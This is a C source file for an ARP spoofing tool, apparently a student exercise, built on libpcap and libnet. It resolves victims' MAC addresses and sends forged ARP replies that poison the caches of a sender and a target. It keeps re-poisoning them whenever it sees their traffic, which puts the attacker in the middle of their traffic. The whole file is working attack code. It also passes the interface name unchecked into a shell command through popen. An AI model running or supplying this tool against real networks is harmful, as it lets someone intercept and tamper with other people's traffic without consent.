#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <pcap.h>             // pcap_open_live
#include <arpa/inet.h>        // htol and_so_on
#include <netinet/if_ether.h> // ether_addr **not working
#include <netinet/in.h>       // in_addr
#include <net/if.h>           // struct ifreg
#include <sys/ioctl.h>        // struct ifreg
#include <libnet.h>

#define MY_BUF_LEN 128
#define ARP_PACKET_LEN 42
#define IP_ADDR_LEN 4

struct arp_adr{
	uint8_t ar_sha[ETHER_ADDR_LEN];	//source mac addr
	uint8_t ar_spa[IP_ADDR_LEN];	//source ip addr
	uint8_t ar_tha[ETHER_ADDR_LEN];	//target mac addr
	uint8_t ar_tpa[IP_ADDR_LEN];	//target ip addr
};

void usage(){
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: arp_spoof en0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
  exit(-1);
}

int getMyIPAddr(const char* network, char* my_buf);
int getMyMacAddr(const char* network, char* my_buf);
void createArpPacket(uint8_t *packet,
  uint16_t arpop,
	uint8_t* ethsrc, uint8_t* ethdst,
	uint8_t* arphasrc, uint8_t* arphadst,
	struct in_addr arpipsrc, struct in_addr arpipdst
);
int vrfyArpPacket(uint32_t packet_len,
  const uint8_t *packet,
  uint8_t* victim_mac_addr
);
int getVictimMacAddr(uint8_t *arp_packet,
  struct in_addr victim_ip_addr,
  uint8_t* victim_mac_addr,
  char c);
int arpInfection(uint8_t *packet,
  struct in_addr send_ip_addr,
  uint8_t* send_mac_addr,
  struct in_addr target_ip_addr,
  uint8_t* target_mac_addr
);
int sniffing(const struct pcap_pkthdr *header,uint8_t *packet);

static uint8_t arp_packet[ARP_PACKET_LEN];
pcap_t* handle = NULL;
int todo;
struct in_addr my_ip_addr;
uint8_t my_mac_addr[ETHER_ADDR_LEN];
uint8_t brdcst_mac_addr[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
uint8_t allz_mac_addr[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

struct in_addr send_ip_addr[4];
struct in_addr target_ip_addr[4];
uint8_t send_mac_addr[4][ETHER_ADDR_LEN];
uint8_t target_mac_addr[4][ETHER_ADDR_LEN];

int main(int argc, char* argv[]){
  todo = (argc/2) - 1;
  char errbuf[PCAP_ERRBUF_SIZE];
  char my_buf[MY_BUF_LEN];
  if (argc < 4) usage();

  char* network   = argv[1];

  handle = pcap_open_live(network, BUFSIZ, 1, 10, errbuf);
  if (handle == NULL) {
  		fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
  		return -1;
  }
  // get my ip address and convert
  if(getMyIPAddr(network, my_buf) != 1){
    printf("Cannot get my IP address\n");
    return -1;
  }
  printf("My IP Address: %s\n", my_buf);
  if(inet_pton(AF_INET, my_buf, &my_ip_addr) != 1){
    printf("Cannot convert my IP address\n");
  }

  //get my mac address and convert
  if(getMyMacAddr(network, my_buf) != 1){
    printf("Cannot get my Mac address\n");
    return -1;
  }
  printf("My Mac Address: %s\n", my_buf);
  sscanf(my_buf, "%x:%x:%x:%x:%x:%x", &my_mac_addr[0], &my_mac_addr[1], &my_mac_addr[2], &my_mac_addr[3], &my_mac_addr[4], &my_mac_addr[5]);

  for(int i=0;i<todo;i++){
    char* send_ip   = argv[(i+1)*2];
    char* target_ip = argv[(i+1)*2 +1];
    if(inet_pton(AF_INET, send_ip, &send_ip_addr[i]) != 1){
      printf("Cannot convert send ip: %s\n", send_ip);
      return -1;
    }
    if(inet_pton(AF_INET, target_ip, &target_ip_addr[i]) != 1){
      printf("Cannot convert target ip: %s\n", target_ip);
      return -1;
    }

    getVictimMacAddr(arp_packet,send_ip_addr[i],send_mac_addr[i],'s');
    getVictimMacAddr(arp_packet,target_ip_addr[i],target_mac_addr[i],'t');

    arpInfection(arp_packet,
      send_ip_addr[i],
      send_mac_addr[i],
      target_ip_addr[i],
      target_mac_addr[i]);
  }

	if (pcap_loop(handle,-1,sniffing,NULL) == -1){
		printf("pcap_loop ERROR\n");
		return -1;
	}


  return 0;
}

int getMyIPAddr(const char* network, char* my_buf){
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("SOCKET ERROR\n");
		return -1;
	}
	strcpy(ifr.ifr_name, network);

	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0){
		printf("ioctl() SIOCGIFADDR ERROR\n");
		close(sock);
		return -1;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	strcpy(my_buf, inet_ntoa(sin->sin_addr));

	close(sock);
	return 1;
}

int getMyMacAddr(const char* network, char* my_buf){
  char command[30];
  sprintf(command,"ifconfig %s | grep ether",network);

  FILE *fp = popen(command, "r");
  if (!fp) {
    printf("file open error\n");
    return -1;
  }

  fgets(my_buf, MY_BUF_LEN, fp);
  my_buf[strcspn(my_buf, "\r\n")] = '\0';
  while(1){
    if((my_buf[0]< 0x30) || (my_buf[0] > 0x39)){
      for(int i=0; i<strlen(my_buf);i++){
        my_buf[i]=my_buf[i+1];
      }
    } else break;
  }

  return 1;
}

void createArpPacket(uint8_t *packet,
  uint16_t arpop, // arp op
	uint8_t* ethsrc, uint8_t* ethdst, // eth s->d
	uint8_t* arphasrc, uint8_t* arphadst, // arp ha s->d
	struct in_addr arpipsrc, struct in_addr arpipdst // arp ip s->d
){
  //eth
  struct libnet_ethernet_hdr* packet_eth = (struct libnet_ethernet_hdr*)packet;
  for (int i=0; i<ETHER_ADDR_LEN; i++){
		packet_eth -> ether_dhost[i] = ethdst[i];
		packet_eth -> ether_shost[i] = ethsrc[i];
	}
  packet_eth->ether_type = htons(ETHERTYPE_ARP);

  //arp_h
  struct libnet_arp_hdr* packet_arp_h = (struct libnet_arp_hdr*)(packet_eth +1);
  packet_arp_h->ar_hrd = htons(ARPHRD_ETHER);
  packet_arp_h->ar_pro = htons(ETHERTYPE_IP);
  packet_arp_h->ar_hln = ETHER_ADDR_LEN;
  packet_arp_h->ar_pln = IP_ADDR_LEN;
  packet_arp_h->ar_op = htons(arpop);

  //arp_a
  struct arp_adr* packet_arp_a = (struct arp_adr*)(packet_arp_h+1);
  for (int i=0; i<ETHER_ADDR_LEN; i++){
		packet_arp_a -> ar_sha[i] = arphasrc[i];
		packet_arp_a -> ar_tha[i] = arphadst[i];
	}
  memcpy(packet_arp_a->ar_spa, &arpipsrc, IP_ADDR_LEN);
	memcpy(packet_arp_a->ar_tpa, &arpipdst, IP_ADDR_LEN);

}


int vrfyArpPacket(uint32_t packet_len, const uint8_t *packet, uint8_t* victim_mac_addr){
    struct libnet_ethernet_hdr* packet_eth = (struct libnet_ethernet_hdr*)packet;
    if (ntohs(packet_eth -> ether_type) != ETHERTYPE_ARP) return -1;

    struct libnet_arp_hdr* packet_arp_h = (struct libnet_arp_hdr*)(packet_eth+1);
    if (ntohs(packet_arp_h -> ar_op) != ARPOP_REPLY) return -1;

    struct arp_adr * packet_arp_a = (struct arp_adr*)(packet_arp_h+1);

		for (int i=0; i<ETHER_ADDR_LEN; i++)
			victim_mac_addr[i] = packet_arp_a -> ar_sha[i];


    return 1;
}

int getVictimMacAddr(uint8_t *arp_packet,
  struct in_addr victim_ip_addr,
  uint8_t* victim_mac_addr,
  char c){

  printf("------------------------\n");
  createArpPacket(arp_packet,
      ARPOP_REQUEST,
      my_mac_addr, brdcst_mac_addr,
      my_mac_addr, allz_mac_addr,
      my_ip_addr, victim_ip_addr
    );

  if(pcap_inject(handle, arp_packet, ARP_PACKET_LEN) == -1){
      printf("Request ARP ERROR");
      return -1;
  }

  struct pcap_pkthdr *header;
  const uint8_t *packet;
  int res = pcap_next_ex(handle, &header, &packet);
  while(1) {

    res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    else if (res == -1 || res == -2) break;


    if (vrfyArpPacket(header->caplen, packet, victim_mac_addr)) break;
  }

  if(c == 's'){
    printf("Sender Mac : ");
    for(int j=0;j<ETHER_ADDR_LEN;j++)
      printf("%s%02X", (j>0 ? ":" : ""), victim_mac_addr[j]);
    printf("\n");
  }
  else if(c == 't'){
    printf("Target Mac : ");
    for(int j=0;j<ETHER_ADDR_LEN;j++)
      printf("%s%02X", (j>0 ? ":" : ""), victim_mac_addr[j]);
    printf("\n");
  }

  return 0;
}

int arpInfection(uint8_t *packet,
  struct in_addr send_ip_addr,
  uint8_t* send_mac_addr,
  struct in_addr target_ip_addr,
  uint8_t* target_mac_addr
){
  printf("------------------------\n");
  printf("ARP Infection ");

  //to sender
  printf(">> To Sender  ");
  createArpPacket(packet,
    ARPOP_REPLY,
    my_mac_addr, send_mac_addr,
    my_mac_addr, send_mac_addr,
    target_ip_addr, send_ip_addr
  );
  if(pcap_inject(handle, packet, ARP_PACKET_LEN) == -1){
      printf("Request ARP ERROR");
      return -1;
  }

  //to target
  printf(">> To Target\n");
  createArpPacket(packet,
    ARPOP_REPLY,
    my_mac_addr, target_mac_addr,
    my_mac_addr, target_mac_addr,
    send_ip_addr, target_ip_addr
  );
  if(pcap_inject(handle, packet, ARP_PACKET_LEN) == -1){
      printf("Request ARP ERROR");
      return -1;
  }
  return 0;
}

int sniffing(const struct pcap_pkthdr *header,uint8_t *packet){
  struct libnet_ethernet_hdr* packet_eth = (struct libnet_ethernet_hdr*)packet;
  struct libnet_arp_hdr* packet_arp_h = (struct libnet_arp_hdr*)(packet_eth+1);
  struct arp_adr * packet_arp_a = (struct arp_adr*)(packet_arp_h+1);

  for(int j=0;j<ETHER_ADDR_LEN;j++)
    printf("%s%02X", (j>0 ? ":" : ""), packet_eth ->ether_dhost[j]);
  printf("\n");

  for(int i=0; i<todo;i++){
    //  source mac이 router일 때(Target --> broadcast)
    if(!memcmp(packet_eth -> ether_shost,target_mac_addr[i],6)) {
      printf("Relaying \n");
      arpInfection(arp_packet,
        send_ip_addr[i],
        send_mac_addr[i],
        target_ip_addr[i],
        target_mac_addr[i]);
    } else{
      //  destination mac == router일 때(Sender --> Target)
      if(!memcmp(packet_eth -> ether_dhost,target_mac_addr[i],6)) {
        printf("Relaying \n");
        arpInfection(arp_packet,
          send_ip_addr[i],
          send_mac_addr[i],
          target_ip_addr[i],
          target_mac_addr[i]);
      // destination mac == broadcast일 때(Sender ARP Table 만료)
      } else if(!memcmp(packet_eth -> ether_dhost,brdcst_mac_addr,6)){
        printf("Relaying \n");
        arpInfection(arp_packet,
          send_ip_addr[i],
          send_mac_addr[i],
          target_ip_addr[i],
          target_mac_addr[i]);
      }
    }
  }
  return 0;
}
